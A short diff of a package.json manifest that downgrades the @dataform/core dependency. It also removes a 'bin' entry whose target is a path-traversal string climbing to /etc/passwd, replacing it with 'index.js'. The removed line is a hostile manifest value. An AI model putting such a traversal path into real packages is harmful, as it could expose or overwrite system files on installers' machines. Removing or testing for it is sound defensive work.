@@ -1,9 +1,9 @@
 {
    "name": "repository-name",
    "dependencies": {
-     "@dataform/core": "2.0.3"
+     "@dataform/core": "2.0.1"
    },
    "bin": {
-        "kascia": "../../../../../../../../../../../../../etc/passwd"
+        "kascia": "index.js"
       }
  }
